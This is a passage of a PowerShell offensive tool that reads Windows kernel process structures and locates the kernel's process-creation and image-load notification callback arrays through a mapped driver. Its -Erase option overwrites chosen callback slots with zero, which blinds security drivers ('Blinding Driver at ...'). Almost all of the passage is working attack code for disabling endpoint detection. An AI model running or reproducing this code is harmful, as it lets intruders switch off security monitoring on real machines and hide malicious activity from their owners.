        [Int32]$ProtectionOffset             = $Global:ProtectedProcessOffset,
        [Int32]$ExitStatusOffset             = $Global:ExitStatusOffset,
        [Int32]$DirectoryTableBaseOffset     = 0x28,  # Embedded inside _KPROCESS (Pcb)
        [Int32]$UserDirectoryTableBaseOffset = 0x388, # Embedded inside _KPROCESS (Pcb)
        [switch]$IgnoreDirectoryTable,
        [switch]$IgnoreToken,
        [switch]$IgnoreExitStatus
    )

    if ($null -eq $Global:ActiveOffset) {
        $Global:ActiveOffset = 0x448
    }

    if ($null -eq $Global:ProtectedProcessOffset) {
        $Global:ProtectedProcessOffset = 2170
    }

    # Ensure TokenOffset fallback exists if not defined globally
    if ($null -eq $Global:TokenOffset) {
        $Global:TokenOffset = 0x4B8 # Common Win10/Win11 x64 offset (adjust if needed)
    }

    # 1. Read and validate PID
    $ProcessID = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $UniqueProcessIdOffset)) -AsLong
    if ($ProcessID -lt 0 -or $ProcessID -gt 500000) { return $null } 

    # 2. Read ImageFileName (ASCII 15 bytes)
    $FirstBlock  = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $ImageFileNameOffset)) -AsLong
    $SecondBlock = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $ImageFileNameOffset + 8)) -AsLong
    
    $Bytes = [System.BitConverter]::GetBytes($FirstBlock) + [System.BitConverter]::GetBytes($SecondBlock)
    $NullIndex = $Bytes.IndexOf(0)
    
    if ($NullIndex -ge 0) {
        $ProcessName = [System.Text.Encoding]::ASCII.GetString($Bytes, 0, $NullIndex)
    } else {
        $ProcessName = [System.Text.Encoding]::ASCII.GetString($Bytes, 0, 15)
    }

    # 3. Read Protection Byte
    $ProtectionRaw    = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $ProtectionOffset)) -AsInt
    $ProtectionByte   = $ProtectionRaw -band 0xFF
    $ProtectionType   = $ProtectionByte -band 0x07
    $ProtectionSigner = ($ProtectionByte -band 0xF0) -shr 4

    $TypeStr = switch ($ProtectionType) {
        1 { "PPL" }
        2 { "PP" }
        Default { "None" }
    }

    $SignerStr = switch ($ProtectionSigner) {
        1 { "Authenticode" }
        2 { "CodeGen" }
        3 { "Antimalware" }
        4 { "Lsa" }
        5 { "Windows" }
        6 { "WinTcb" }
        7 { "WinSystem" }
        8 { "App" }
        Default { "None" }
    }

    # 4. Read Token Pointer (UNCOMMENTED & FIXED)
    $TokenPtr = 0
    if (-not $IgnoreToken.IsPresent) {
        # Fast reference pointer to the process primary token structure
        $TokenPtr = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $Global:TokenOffset)) -AsLong
    }

    # 5. Handle Exit Status & Zombie Detection
    $StatusStr = "STILL_ACTIVE"
    $IsZombie = $false # Explicitly default to false per iteration to prevent state leak
    
    if (-not $IgnoreExitStatus.IsPresent) {
        $ExitStatusRaw = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $ExitStatusOffset)) -AsInt
        
        if ($ExitStatusRaw -ne 0x00000103) {
            $IsZombie = $true
            $StatusStr = ("0x{0:X8}" -f $ExitStatusRaw)
        }
    }

    # 6. Read CR3 Directory Tables
    $Cr3KernelRaw = 0
    $PhysicalKernelAddress = 0
    $Cr3UserRaw = 0
    $PhysicalUserAddress = 0

    if (-not $IgnoreDirectoryTable.IsPresent) {
        $Cr3KernelRaw = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $DirectoryTableBaseOffset)) -AsLong
        $PhysicalKernelAddress = $Cr3KernelRaw -band 0xFFFFFFFFFFFFF000

        $Cr3UserRaw = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $UserDirectoryTableBaseOffset)) -AsLong
        $PhysicalUserAddress = $Cr3UserRaw -band 0xFFFFFFFFFFFFF000
    }

    $PebAddress = Read-VirtualAddress -VA ([IntPtr]::Add($EprocessBase, $Global:PEBOffset)) -AsLong

    # 7. Output custom object
    return [PSCustomObject]@{
        EprocessAddress       = "0x{0:X16}" -f $EprocessBase.ToInt64()
        ProcessID             = $ProcessID
        ProcessName           = $ProcessName
        ProtectionType        = $TypeStr
        ProtectionSigner      = $SignerStr
        TokenAddress          = if (-not $IgnoreToken.IsPresent) { "0x{0:X16}" -f $TokenPtr } else { "IGNORED" }
        KernelDirectoryBase   = if (-not $IgnoreDirectoryTable.IsPresent) { "0x{0:X16}" -f $Cr3KernelRaw } else { "IGNORED" }
        KernelPhysicalAddress = if (-not $IgnoreDirectoryTable.IsPresent) { "0x{0:X16}" -f $PhysicalKernelAddress } else { "IGNORED" }
        UserDirectoryBase     = if (-not $IgnoreDirectoryTable.IsPresent) { "0x{0:X16}" -f $Cr3UserRaw } else { "IGNORED" }
        UserPhysicalAddress   = if (-not $IgnoreDirectoryTable.IsPresent) { "0x{0:X16}" -f $PhysicalUserAddress } else { "IGNORED" }
        PebAddress            = $PebAddress
        ExitStatus            = $StatusStr
        IsZombie              = $IsZombie
    }
}
#endregion
#region Callback
Function Get-CreateProcessCallback {
    param (
        [ValidateRange(0,63)]
        [Int32[]]$Slot,
        [switch]$Erase
    )

    # 1. Resolve Internal RVA
    $hMod = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
    $Ptr = [IntPtr]::Zero
    $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'PsSetCreateProcessNotifyRoutine' -Encoding Ansi), 0, [ref]$Ptr, 0, 0) | Out-Null
    $Buf = New-Object Byte[] 20; [Marshal]::Copy($Ptr, $Buf, 0, 20)
    $E8 = [Array]::IndexOf($Buf, [Byte]0xE8)
    $InternalRVA = ([BitConverter]::ToInt32($Buf, $E8 + 1) + $Ptr.ToInt64() + $E8 + 5) - $hMod.ToInt64()

    # Safe Address
    # $StubPtr = [IntPtr]::Zero
    # $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'DbgBreakPoint' -Encoding Ansi), 0, [ref]$StubPtr, 0, 0) | Out-Null
    # $KBase = Get-KernelBaseAddress
    # $StubInternalRVA = [Int64]($StubPtr - $hMod.ToInt64())
    # $SafeStubAddress = [int64]$KBase + $StubInternalRVA + 1
    $SafeStubAddress = [IntPtr]::Zero

    # 2. Resolve Modules
    $sz = 0; $NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, 0) | Out-Null
    $mBuf = [Marshal]::AllocHGlobal($sz); $ModuleList = @()
    if ($NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, $mBuf) -eq 0) {
        for ($i=0; $i -lt ($sz/0x110); $i++) {
            $e = [IntPtr]::Add($mBuf, ($i * 0x110))
            $ModuleList += [PSCustomObject]@{ B=[int64]([Marshal]::ReadIntPtr($e,0)); E=[int64]([Marshal]::ReadIntPtr($e,0))+[Marshal]::ReadInt32($e,8); N=[Marshal]::PtrToStringAnsi([IntPtr]::Add($e,14)).Substring([Marshal]::ReadInt16($e,12)) }
        }
    }; [Marshal]::FreeHGlobal($mBuf)

    # 3. Locate Live Array
    $KBase = Get-KernelBaseAddress
    $RoutineAddr = [int64]$KBase + $InternalRVA
    $fBuf = New-Object Byte[] 200
    $va = Map-VirtualAddress -VA ([IntPtr]$RoutineAddr) -BlockSize 200 -DriverName mtxvxd
    if ($va) { [Marshal]::Copy($va, $fBuf, 0, 200); Unmap-VirtualAddress $va -DriverName mtxvxd | Out-Null }
    $idx = -1; for($i=0; $i -lt 193; $i++){ if($fBuf[$i..($i+2)] -contains 0x4C -and $fBuf[$i+1] -eq 0x8D -and $fBuf[$i+2] -eq 0x2D){ $idx=$i; break }}
    $ArrayVA = [int64]([BitConverter]::ToInt32($fBuf, $idx+3) + $RoutineAddr + $idx + 7)

    if ($Erase.IsPresent) {
        foreach ($TargetSlot in $Slot) {
            $TargetAddress = [IntPtr]::Add($ArrayVA, ($TargetSlot * 8))
            Write-Host "Blinding Driver at $TargetAddress..." -ForegroundColor Red
            $va = Map-VirtualAddress `
                -VirtualAddress $TargetAddress `
                -BlockSize 8 `
                -DriverName mtxvxd
            if ($va) {
                [Marshal]::WriteInt64($va, 0L)
                Unmap-VirtualAddress `
                    -MappedAddress $va `
                    -DriverName MtxVxd | Out-Null
            }
            Write-Host "Slot $TargetSlot has been nullified." -ForegroundColor Green
        }
        return
    }

    Write-Host
    Write-Host "----- ENTRY DUMP -----"

    for ($i = 0; $i -lt 64; $i++) {
        $Raw = 0
        try {
            $Raw = Read-VirtualAddress -VA ([IntPtr]::Add($ArrayVA, ($i * 8))) -AsLong
        } catch {}
        if ($Raw -eq 0 -or $Raw -eq -1 -or !$Raw) { 
            continue 
        }
    
        # Convert hex string to Int64 if necessary
        $RawInt = if ($Raw -is [string]) { [Convert]::ToInt64($Raw, 16) } else { [int64]$Raw }
    
        $Block = $RawInt -band -16
        $Func = [IntPtr](Read-VirtualAddress -VA ([IntPtr]::Add($Block,8)) -AsLong)
    
        # Convert function hex string to Int64
        $FuncInt = if ($Func -is [string]) { [Convert]::ToInt64($Func, 16) } else { [int64]$Func }

        $Owner = "Unknown"
        foreach ($Mod in $ModuleList) { 
            if ($FuncInt -ge $Mod.B -and $FuncInt -lt $Mod.E) { $Owner = $Mod.N; break } 
        }

        $HexFunc = "0x{0:X16}" -f $FuncInt
        Write-Host "[Slot $i] " -NoNewline
        Write-Host "$($Owner.PadRight(15))" -ForegroundColor Yellow -NoNewline
        Write-Host " | Function: $HexFunc"
    }
}
Function Get-LoadImageCallbacks {
    param (
        [ValidateRange(0,63)]
        [Int32[]]$Slot,
        [switch]$Erase
    )

    # 1. Resolve Internal RVA
    $hMod = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
    $Ptr = [IntPtr]::Zero
    $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'PsSetLoadImageNotifyRoutine' -Encoding Ansi), 0, [ref]$Ptr, 0, 0) | Out-Null
    $Buf = New-Object Byte[] 20; [Marshal]::Copy($Ptr, $Buf, 0, 20)
    $E8 = [Array]::IndexOf($Buf, [Byte]0xE8)
    $InternalRVA = ([BitConverter]::ToInt32($Buf, $E8 + 1) + $Ptr.ToInt64() + $E8 + 5) - $hMod.ToInt64()

    # Safe Address
    # $StubPtr = [IntPtr]::Zero
    # $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'DbgBreakPoint' -Encoding Ansi), 0, [ref]$StubPtr, 0, 0) | Out-Null
    # $KBase = Get-KernelBaseAddress
    # $StubInternalRVA = [Int64]($StubPtr - $hMod.ToInt64())
    # $SafeStubAddress = [int64]$KBase + $StubInternalRVA + 1
    $SafeStubAddress = [IntPtr]::Zero

    # 2. Resolve Modules
    $sz = 0; $NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, 0) | Out-Null
    $mBuf = [Marshal]::AllocHGlobal($sz); $ModuleList = @()
    if ($NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, $mBuf) -eq 0) {
        for ($i=0; $i -lt ($sz/0x110); $i++) {
            $e = [IntPtr]::Add($mBuf, ($i * 0x110))
            $ModuleList += [PSCustomObject]@{ B=[int64]([Marshal]::ReadIntPtr($e,0)); E=[int64]([Marshal]::ReadIntPtr($e,0))+[Marshal]::ReadInt32($e,8); N=[Marshal]::PtrToStringAnsi([IntPtr]::Add($e,14)).Substring([Marshal]::ReadInt16($e,12)) }
        }
    }; [Marshal]::FreeHGlobal($mBuf)

    # 3. Locate Live Array
    $KBase = Get-KernelBaseAddress
    $RoutineAddr = [int64]$KBase + $InternalRVA
    $fBuf = New-Object Byte[] 200
    $va = Map-VirtualAddress -VA ([IntPtr]$RoutineAddr) -BlockSize 200 -DriverName mtxvxd
    if ($va) { [Marshal]::Copy($va, $fBuf, 0, 200); Unmap-VirtualAddress $va -DriverName mtxvxd | Out-Null }
    # Search for 48 8D 0D (LEA RCX, [RIP + Offset])
    $idx = -1
    for($i=0; $i -lt 193; $i++){ 
        if($fBuf[$i] -eq 0x48 -and $fBuf[$i+1] -eq 0x8D -and $fBuf[$i+2] -eq 0x0D){ 
            $idx = $i
            break 
        } 
    }

    if ($idx -eq -1) { Write-Error "Could not find the array LEA pattern!"; return }

    # Calculate the Absolute Virtual Address of the Array
    # Instruction length is 7 bytes (3 for opcode + 4 for displacement)
    $RelativeOffset = [BitConverter]::ToInt32($fBuf, $idx + 3)
    $ArrayVA = [int64]($RoutineAddr + $idx + 7 + $RelativeOffset)

    if ($Erase.IsPresent) {
        foreach ($TargetSlot in $Slot) {
            $TargetAddress = [IntPtr]::Add($ArrayVA, ($TargetSlot * 8))
            Write-Host "Blinding Driver at $TargetAddress..." -ForegroundColor Red
            $va = Map-VirtualAddress `
                -VirtualAddress $TargetAddress `
                -BlockSize 8 `
                -DriverName mtxvxd
            if ($va) {
                [Marshal]::WriteInt64($va, 0L)
                Unmap-VirtualAddress `
                    -MappedAddress $va `
                    -DriverName MtxVxd | Out-Null
            }
            Write-Host "Slot $TargetSlot has been nullified." -ForegroundColor Green
        }
        return
    }

    Write-Host
    Write-Host "----- ENTRY DUMP -----"

    for ($i = 0; $i -lt 64; $i++) {
        $Raw = 0
        try {
            $Raw = [IntPtr](Read-VirtualAddress -VA ([IntPtr]::Add($ArrayVA, ($i * 8))) -AsLong)
        } catch {}
        if ($Raw -eq 0 -or $Raw -eq -1 -or !$Raw) { 
            continue 
        }
    
        # Convert hex string to Int64 if necessary
        $RawInt = if ($Raw -is [string]) { [Convert]::ToInt64($Raw, 16) } else { [int64]$Raw }
    
        $Block = $RawInt -band -16
        $Func = [IntPtr](Read-VirtualAddress -VA ([IntPtr]::Add($Block,8)) -AsLong)
    
        # Convert function hex string to Int64
        $FuncInt = if ($Func -is [string]) { [Convert]::ToInt64($Func, 16) } else { [int64]$Func }

        $Owner = "Unknown"
        foreach ($Mod in $ModuleList) { 
            if ($FuncInt -ge $Mod.B -and $FuncInt -lt $Mod.E) { $Owner = $Mod.N; break } 
        }

        $HexFunc = "0x{0:X16}" -f $FuncInt
        Write-Host "[Slot $i] " -NoNewline
        Write-Host "$($Owner.PadRight(15))" -ForegroundColor Yellow -NoNewline
        Write-Host " | Function: $HexFunc"
    }
}
